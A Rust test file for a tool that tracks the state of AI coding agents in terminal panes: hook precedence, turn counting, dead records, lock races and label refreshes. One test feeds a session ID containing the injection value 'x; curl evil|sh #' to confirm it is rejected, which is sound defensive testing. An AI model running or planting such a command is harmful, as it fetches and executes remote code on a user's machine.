/// Without this the tower shows every agent as IDLE no matter what it is doing.
#[test]
fn observations_carry_state_and_session_id() {
    let (_d, s) = store();
    let panes = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    sync(&s, &panes, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&panes), at(0)).unwrap();

    let got = s.list().unwrap();
    assert_eq!(got[0].state, AgentState::Working, "backend said so");
    assert_eq!(got[0].session_id, "sid-1", "what resume needs");
}

/// herdr relays whatever ID the agent reported; one that is a shell command is
/// not written, and the ID the record already had stays.
#[test]
fn an_invalid_backend_session_id_is_not_stored() {
    let (_d, s) = store();
    let panes = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    sync(&s, &panes, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&panes), at(0)).unwrap();

    let mut evil = observations(&panes);
    evil.get_mut("w2:p1").unwrap().session_id = "x; curl evil|sh #".into();
    apply_observations(&s, &evil, at(1)).unwrap();
    assert_eq!(s.list().unwrap()[0].session_id, "sid-1");
}

/// unknown must not be translated — herdr's docs say it does not prove completion.
#[test]
fn unknown_status_leaves_the_state_alone() {
    let (_d, s) = store();
    let panes = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    sync(&s, &panes, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&panes), at(0)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Working);

    let unknown = vec![pane("w2:p1", Some("claude"), "unknown", "/proj")];
    apply_observations(&s, &observations(&unknown), at(1)).unwrap();
    assert_eq!(
        s.list().unwrap()[0].state,
        AgentState::Working,
        "unknown is not a completion state"
    );
}

/// A hook knows more than the state: it carries the task and the question.
#[test]
fn a_fresh_hook_outranks_the_backend() {
    let (_d, s) = store();
    let mut a = Agent::new("claude-w2:p1", "claude", at(0));
    a.pane.pane_id = "w2:p1".into();
    a.mark_hook(at(0));
    a.transition(AgentState::Waiting, at(0));
    a.task = "승인 대기".into();
    s.save(&a).unwrap();

    let panes = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    apply_observations(&s, &observations(&panes), at(0) + Duration::seconds(30)).unwrap();

    let got = s.list().unwrap();
    assert_eq!(got[0].state, AgentState::Waiting, "the hook's word stands");
    assert_eq!(
        got[0].session_id, "sid-1",
        "but a session ID a hook cannot supply lands"
    );
}

/// Precedence expires, or a record freezes when hooks stop arriving.
#[test]
fn a_stale_hook_yields_to_the_backend() {
    let (_d, s) = store();
    let mut a = Agent::new("claude-w2:p1", "claude", at(0));
    a.pane.pane_id = "w2:p1".into();
    a.mark_hook(at(0));
    a.transition(AgentState::Working, at(0));
    s.save(&a).unwrap();

    let panes = vec![pane("w2:p1", Some("claude"), "idle", "/proj")];
    apply_observations(&s, &observations(&panes), at(10)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Idle);
}

/// Hooks derive the same ID from their own coordinate alone.
#[test]
fn record_ids_are_derivable_from_a_pane() {
    assert_eq!(id_for_pane("claude", "w2:p4S"), "claude-w2:p4S");
}

/// A session revived outside `restore` does not leave a duplicate row.
///
/// The agent comes back under a *new* pane ID, so the old DEAD record matches
/// nothing by coordinate. Without the slot check it sat beside the live one for
/// the full retention window, and `status` showed one agent twice for a day.
#[test]
fn a_dead_record_goes_when_a_live_pane_takes_its_place() {
    let (_d, s) = store();
    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(0),
    )
    .unwrap();
    sync(&s, &[], &labels(), at(1)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Dead);

    // Same kind, same workspace, same folder — a different pane.
    sync(
        &s,
        &[pane("w2:p9", Some("claude"), "idle", "/proj")],
        &labels(),
        at(2),
    )
    .unwrap();

    let got = s.list().unwrap();
    assert_eq!(
        got.len(),
        1,
        "one agent, one row — got {:?}",
        got.iter().map(|a| (&a.id, a.state)).collect::<Vec<_>>()
    );
    assert_eq!(got[0].id, "claude-w2:p9", "the live record is the one kept");
}

/// A dead record whose slot nobody took is kept for the retention window.
///
/// The cleanup above must not become "delete every dead record", which is the
/// whole reason the window exists: somebody who stepped away still gets to see
/// what died.
#[test]
fn a_dead_record_in_an_empty_slot_still_waits_out_the_window() {
    let (_d, s) = store();
    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(0),
    )
    .unwrap();
    sync(&s, &[], &labels(), at(1)).unwrap();

    // A live pane elsewhere: different folder, so a different slot.
    sync(
        &s,
        &[pane("w2:p9", Some("claude"), "idle", "/other")],
        &labels(),
        at(2),
    )
    .unwrap();
    assert_eq!(s.list().unwrap().len(), 2, "the dead row is still shown");
}

/// Marking a completion read must survive the next backend observation.
///
/// herdr reports the same persistent `done` for that pane until the agent works
/// again, and there is no API to acknowledge it. So the observation used to map
/// that same `done` straight back to DONE_UNREAD — immediately when no hook was
/// fresh, and after the two-minute precedence window when one was. "Read until
/// new work finishes" could not hold.
#[test]
fn a_completion_marked_read_does_not_come_back() {
    let (_d, s) = store();
    let panes = vec![pane("w2:p1", Some("claude"), "done", "/proj")];
    sync(&s, &panes, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&panes), at(0)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::DoneUnread);

    s.mark_read("claude-w2:p1", at(1)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Idle);

    // The backend has not changed its mind, and must not be allowed to undo it.
    apply_observations(&s, &observations(&panes), at(2)).unwrap();
    apply_observations(&s, &observations(&panes), at(60)).unwrap();
    assert_eq!(
        s.list().unwrap()[0].state,
        AgentState::Idle,
        "the read stood only until the next observation"
    );
}

/// A *new* completion still arrives unread.
///
/// The acknowledgement is consumed by any observation that is not done, so the
/// fix above must not turn into "this agent can never be unread again".
#[test]
fn work_after_a_read_can_complete_unread_again() {
    let (_d, s) = store();
    let done = vec![pane("w2:p1", Some("claude"), "done", "/proj")];
    sync(&s, &done, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&done), at(0)).unwrap();
    s.mark_read("claude-w2:p1", at(1)).unwrap();

    // The agent picks up new work…
    let working = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    apply_observations(&s, &observations(&working), at(2)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Working);

    // …and finishes it. This completion nobody has seen.
    apply_observations(&s, &observations(&done), at(3)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::DoneUnread);
}

/// One prompt counts one turn even when both of its witnesses report it.
///
/// A start hook runs in the CLI's own process and the poll runs on its own
/// clock, so the poll can get there first: the scanner sees a settled record
/// working and infers a turn, then the hook arrives and counts the same prompt.
/// A batch watch reads a jump in that count as *its own* instruction having
/// started, so the extra one hands it an unrelated turn's completion.
#[test]
fn a_poll_and_a_late_hook_do_not_both_count_the_same_prompt() {
    let (_d, s) = store();
    let idle = vec![pane("w2:p1", Some("claude"), "idle", "/proj")];
    sync(&s, &idle, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&idle), at(0)).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().work_seq, 0);

    // The poll beats the hook to it.
    let working = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    apply_observations(&s, &observations(&working), at(1)).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().work_seq, 1);

    // Then the prompt's own hook lands, for that same prompt, a moment behind.
    let late = at(1) + Duration::seconds(2);
    let mut a = s.load("claude-w2:p1").unwrap();
    a.mark_hook(late);
    a.begin_turn(late);
    s.save(&a).unwrap();
    assert_eq!(
        s.load("claude-w2:p1").unwrap().work_seq,
        1,
        "the hook counted the turn the scanner had already inferred"
    );

    // And the turn after it still counts, from either side.
    let done = vec![pane("w2:p1", Some("claude"), "done", "/proj")];
    apply_observations(&s, &observations(&done), at(60)).unwrap();
    let mut a = s.load("claude-w2:p1").unwrap();
    a.mark_hook(at(61));
    a.begin_turn(at(61));
    s.save(&a).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().work_seq, 2);
}

/// A turn beginning is not something a hook that already fired can speak to.
///
/// Hook precedence keeps the backend from overwriting what a hook knows — the
/// question, the task — for two minutes. But a Stop hook a minute ago said this
/// agent *finished*, which is no answer to the backend now seeing it work. While
/// that counted as a fresh hook, a prompt whose own start hook was lost went
/// uncounted, and the batch watch waiting on that count timed out on finished
/// work.
#[test]
fn a_turn_start_is_counted_even_while_the_last_turns_hook_is_still_fresh() {
    let (_d, s) = store();
    let done = vec![pane("w2:p1", Some("claude"), "done", "/proj")];
    sync(&s, &done, &labels(), at(0)).unwrap();

    // The previous turn's Stop hook: recent, and about a turn that is over.
    let mut a = s.load("claude-w2:p1").unwrap();
    a.mark_hook(at(0));
    a.transition(AgentState::DoneUnread, at(0));
    a.ask = "승인해 주세요".into();
    s.save(&a).unwrap();

    // A new prompt whose start hook is lost. The backend sees the work.
    let working = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    apply_observations(&s, &observations(&working), at(1)).unwrap();

    let got = s.load("claude-w2:p1").unwrap();
    assert_eq!(got.state, AgentState::Working);
    assert_eq!(got.work_seq, 1, "the turn the watch is waiting on");

    // The precedence it does keep: while that hook is fresh, the backend's own
    // idea of how the turn *ends* still does not overwrite it.
    let mut a = s.load("claude-w2:p1").unwrap();
    a.mark_hook(at(1));
    a.transition(AgentState::Waiting, at(1));
    s.save(&a).unwrap();
    apply_observations(&s, &observations(&done), at(2)).unwrap();
    assert_eq!(
        s.load("claude-w2:p1").unwrap().state,
        AgentState::Waiting,
        "a fresh hook still outranks the backend on how a turn ends"
    );
}

/// The backend lags the CLI's own hook at the end of a turn. A poll in that
/// gap — the hook has said DONE, the backend still says working — is the
/// finished turn's tail, not a new one; once the grace is over, a backend that
/// still sees work is believed.
#[test]
fn a_working_poll_right_after_a_stop_hook_is_not_a_new_turn() {
    let (_d, s) = store();
    let done = vec![pane("w2:p1", Some("opencode"), "done", "/proj")];
    sync(&s, &done, &labels(), at(0)).unwrap();

    let stop = at(1);
    let mut a = s.load("opencode-w2:p1").unwrap();
    a.mark_hook(stop - Duration::seconds(30));
    a.begin_turn(stop - Duration::seconds(30));
    a.mark_hook(stop);
    a.transition(AgentState::DoneUnread, stop);
    s.save(&a).unwrap();

    let working = vec![pane("w2:p1", Some("opencode"), "working", "/proj")];
    apply_observations(
        &s,
        &observations(&working),
        stop + Duration::milliseconds(500),
    )
    .unwrap();
    let got = s.load("opencode-w2:p1").unwrap();
    assert_eq!(got.state, AgentState::DoneUnread, "the hook's DONE stands");
    assert_eq!(got.work_seq, 1, "no turn was started");

    apply_observations(&s, &observations(&working), stop + TURN_START_GRACE).unwrap();
    let got = s.load("opencode-w2:p1").unwrap();
    assert_eq!(
        got.state,
        AgentState::Working,
        "past the grace, work is work"
    );
    assert_eq!(got.work_seq, 2);
}

/// A server that cannot be reached leaves the records alone.
///
/// Tempting to do the opposite: `plan_restore` only considers DEAD records, so an
/// unreachable server looks like it should let everything fall to DEAD and give
/// `restore` candidates. It was tried, and it is wrong twice over.
///
/// A DEAD transition resets `state_since` and overwrites DONE_UNREAD, so one
/// transient socket error during any `status` call would erase every unread
/// completion and every agent's age — permanently, because a later revival stamps
/// the revival time. And it buys nothing: `restore` cannot spawn into a server
/// that is not there.
///
/// The reboot case works without it, and the test below shows why.
#[test]
fn an_unreachable_backend_leaves_the_records_untouched() {
    let (_d, s) = store();
    let panes = vec![pane("w2:p1", Some("claude"), "done", "/proj")];
    sync(&s, &panes, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&panes), at(0)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::DoneUnread);

    let gone = herdrx::Herdr::at("/nonexistent/herdr.sock");
    tower_scan::sync_backend(&s, &gone, at(1)).expect("an absent server is not an error");

    let got = s.list().unwrap();
    assert_eq!(
        got[0].state,
        AgentState::DoneUnread,
        "a socket blip must not eat an unread completion"
    );
    assert_eq!(got[0].state_since, at(0), "nor the agent's age");
}

/// The reboot path `restore` actually runs on.
///
/// herdr restores its own workspaces and tabs, so after a reboot the server is
/// up and reporting panes — they just have no agent in them. A shell pane is not
/// an agent, so the records fall to DEAD and `plan_restore` has its candidates,
/// without any special case for an unreachable server.
#[test]
fn panes_that_came_back_empty_are_what_makes_restore_work() {
    let (_d, s) = store();
    let live = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    sync(&s, &live, &labels(), at(0)).unwrap();
    apply_observations(&s, &observations(&live), at(0)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Working);

    // Same coordinate, nothing running in it — herdr's own layout restore.
    let shells = vec![pane("w2:p1", None, "unknown", "/proj")];
    sync(&s, &shells, &labels(), at(1)).unwrap();

    assert_eq!(
        s.list().unwrap()[0].state,
        AgentState::Dead,
        "restore has nothing to offer while this stays live"
    );
}

/// A hook's write is not overwritten by a scan that started before it.
///
/// Atomic replacement stops a reader seeing half a file; it does not stop the
/// scanner from loading a record, a hook committing DONE_UNREAD with its task and
/// question, and the scanner then publishing the snapshot it was already holding.
/// Nothing fails, so nothing notices.
///
/// The two processes are threads here, which is the same contention: the store
/// lock is an `flock`, so it serializes threads and processes alike.
#[test]
fn a_scan_does_not_overwrite_a_hook_that_landed_mid_pass() {
    let d = tempfile::tempdir().unwrap();
    let dir = d.path().to_path_buf();
    let s = Store::new(&dir).unwrap();

    let panes = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    sync(&s, &panes, &labels(), at(0)).unwrap();

    // The hook side: take the store, write a completion with its question, let go.
    let hook = {
        let dir = dir.clone();
        std::thread::spawn(move || {
            let s = Store::new(&dir).unwrap();
            for _ in 0..40 {
                let _lock = s.try_lock_briefly();
                let mut a = s.load("claude-w2:p1").unwrap();
                a.mark_hook(at(1));
                a.transition(AgentState::DoneUnread, at(1));
                a.ask = "승인해 주세요".into();
                s.save(&a).unwrap();
                drop(_lock);
                std::thread::sleep(std::time::Duration::from_millis(1));
            }
        })
    };
    // The scanner side, running the same pass over and over against it.
    for _ in 0..40 {
        sync(&s, &panes, &labels(), at(2)).unwrap();
        apply_observations(&s, &observations(&panes), at(2)).unwrap();
    }
    hook.join().unwrap();

    // Whatever landed last, the record must be *coherent*: a hook's state always
    // arrives with its question, and the scanner never invents one.
    let got = s.load("claude-w2:p1").unwrap();
    if got.state == AgentState::DoneUnread {
        assert_eq!(
            got.ask, "승인해 주세요",
            "the hook's state survived without the question it came with"
        );
    }
    assert_eq!(
        got.pane.pane_id, "w2:p1",
        "the coordinate survived either way"
    );
}

/// A pane's name and title belong to the pane, so they are refreshed from the
/// backend on every sync — a `/rename` has to reach the record without waiting
/// for a hook that may never fire.
#[test]
fn a_rename_reaches_the_row_without_a_hook() {
    let (_d, s) = store();
    let mut p = pane("w2:p4S", Some("claude"), "working", "/repo");
    p.label = Some("herdr-rust".into());
    sync(&s, std::slice::from_ref(&p), &labels(), at(0)).unwrap();

    let id = s.list().unwrap()[0].id.clone();
    let a = s.load(&id).unwrap();
    assert_eq!(a.label, "herdr-rust");
    assert_eq!(
        a.headline(),
        "herdr-rust",
        "with no title yet, the name a person typed is the row"
    );

    // The title the CLI rewrites every turn leads once there is one. The name
    // is covered, not dropped — the detail card still carries it.
    p.title = "herdr-tower".into();
    sync(&s, std::slice::from_ref(&p), &labels(), at(1)).unwrap();
    let a = s.load(&id).unwrap();
    assert_eq!(a.label, "herdr-rust");
    assert_eq!(a.headline(), "herdr-tower");

    // Un-naming has to clear it. Carrying the label across from the previous
    // record would strand it as the last thing anyone saw.
    p.label = None;
    sync(&s, std::slice::from_ref(&p), &labels(), at(2)).unwrap();
    let a = s.load(&id).unwrap();
    assert_eq!(a.label, "");
    assert_eq!(a.headline(), "herdr-tower");
}

/// The label outranks a question, and the row still says the pane is waiting —
/// which is the reason nothing is lost by putting it first.
#[test]
fn a_label_covers_the_question_but_not_the_state() {
    let (_d, s) = store();
    let mut p = pane("w2:p4S", Some("claude"), "working", "/repo");
    p.label = Some("dbeaver".into());
    sync(&s, std::slice::from_ref(&p), &labels(), at(0)).unwrap();

    let id = s.list().unwrap()[0].id.clone();
    let mut a = s.load(&id).unwrap();
    a.ask = "awaiting approval".into();
    a.transition(AgentState::Waiting, at(0));
    s.save(&a).unwrap();

    let a = s.load(&id).unwrap();
    assert_eq!(a.headline(), "dbeaver");
    assert_eq!(
        a.state,
        AgentState::Waiting,
        "the state column still says it"
    );
    assert_eq!(
        a.ask, "awaiting approval",
        "and the detail card still has it"
    );
}

/// 🚨 A failed `tab.list` must not blank every record's tab label.
///
/// `tab.list` can fail on its own while `pane.list` succeeds, and the empty map
/// then took the `tab›` part out of every record's TITLE at once and rewrote
/// every file to say so — which also defeats the write-only-what-changed rule
/// (#26). The workspace label already fell back to what the record said; the tab
/// label did not (#44).
#[cfg(unix)]
#[test]
fn a_lost_tab_lookup_keeps_the_tab_the_record_already_had() {
    let pane = r#"{"pane_id":"w2:p1","workspace_id":"w2","tab_id":"w2:t7","cwd":"/proj",
        "agent":"claude","agent_status":"idle"}"#;
    let untabbed = r#"{"pane_id":"w2:p2","workspace_id":"w2","tab_id":"w2:t8","cwd":"/other",
        "agent":"claude","agent_status":"idle"}"#;
    let panes = format!(r#"{{"result":{{"panes":[{pane},{untabbed}]}}}}"#);
    let workspaces =
        r#"{"result":{"workspaces":[{"workspace_id":"w2","label":"dbstore"}]}}"#.to_string();

    let (_good_sock, good) = serve(vec![
        ("pane.list", panes.clone()),
        ("workspace.list", workspaces.clone()),
        ("tab.list", format!(r#"{{"result":{{"tabs":{TWO_TABS}}}}}"#)),
    ]);
    let (d, s) = store();
    tower_scan::sync_backend(&s, &good, at(0)).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().pane.tab, "pr-2752");

    // The same panes from a server that cannot answer `tab.list`.
    let before = inodes(d.path());
    let (_lost_sock, lost) = serve(vec![("pane.list", panes), ("workspace.list", workspaces)]);
    tower_scan::sync_backend(&s, &lost, at(1)).unwrap();

    let a = s.load("claude-w2:p1").unwrap();
    assert_eq!(a.pane.tab, "pr-2752", "the tab the record already had");
    assert_eq!(a.pane.session, "dbstore", "and the workspace name with it");
    assert_eq!(
        s.load("claude-w2:p2").unwrap().pane.tab,
        "",
        "a record that never had a tab label has nothing to keep"
    );
    assert_eq!(inodes(d.path()), before, "nothing was rewritten");
}

/// A record whose file carries no workspace ID is listed with one adopted from
/// its coordinate (`Store::list`), and the scan writes back over that listed
/// copy. Its own file must still count as the copy it read: otherwise the
/// record looks written underneath on every pass and is never updated again —
/// not its title, and not its death.
#[test]
fn a_record_listed_with_an_adopted_workspace_is_still_written() {
    let (_d, s) = store();
    let first = pane("w2:p1", Some("claude"), "idle", "/proj");
    sync(&s, std::slice::from_ref(&first), &labels(), at(0)).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().pane.workspace_id, "w2");

    // Written without a workspace, the way an early hook record is.
    let mut bare = Agent::new("claude-w2:p2", "claude", at(0));
    bare.pane.pane_id = "w2:p2".into();
    s.save(&bare).unwrap();
    assert!(s.load("claude-w2:p2").unwrap().pane.workspace_id.is_empty());
    let listed = s.list().unwrap();
    let listed = listed.iter().find(|a| a.id == "claude-w2:p2").unwrap();
    assert_eq!(listed.pane.workspace_id, "w2", "adopted in memory");

    let mut second = pane("w2:p2", Some("claude"), "idle", "/proj");
    second.title = "a new title".into();
    sync(&s, &[first.clone(), second], &labels(), at(1)).unwrap();
    let kept = s.load("claude-w2:p2").unwrap();
    assert_eq!(kept.title, "a new title");
    assert_eq!(kept.pane.workspace_id, "w2");

    // And once it is gone, it is marked dead.
    let mut bare = s.load("claude-w2:p2").unwrap();
    bare.pane.workspace_id.clear();
    s.save(&bare).unwrap();
    sync(&s, &[first], &labels(), at(2)).unwrap();
    assert_eq!(s.load("claude-w2:p2").unwrap().state, AgentState::Dead);
}
